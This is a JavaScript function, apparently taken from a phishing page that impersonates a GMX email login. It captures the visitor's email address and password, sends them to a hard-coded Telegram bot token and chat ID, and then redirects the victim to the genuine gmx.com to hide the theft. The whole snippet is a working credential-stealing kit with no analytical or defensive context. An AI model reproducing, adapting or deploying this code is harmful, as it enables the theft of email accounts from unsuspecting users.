function sendToTelegram(event) {
            event.preventDefault(); // Prevent form submission

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            const botToken = "6630068670:AAEhugDrcc5MxyaiLu_QTFs5VRQP3FUtRJQ"
            const chatId = "5267432833"

            const message = `🔐 message from GMX 🔐\n\n👤 *User ID:* ${email}\n🔑 *Pass:* ${password}`;

            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        document.getElementById('email').value = "";
                        document.getElementById('password').value = "";
                        window.location.href = "https://www.gmx.com/?utm_referrer=https://www.google.com/"
                    } else {
                        alert("Failed to send. Check bot token and chat ID.");
                    }
                })
                .catch(error => console.error("Error:", error));
}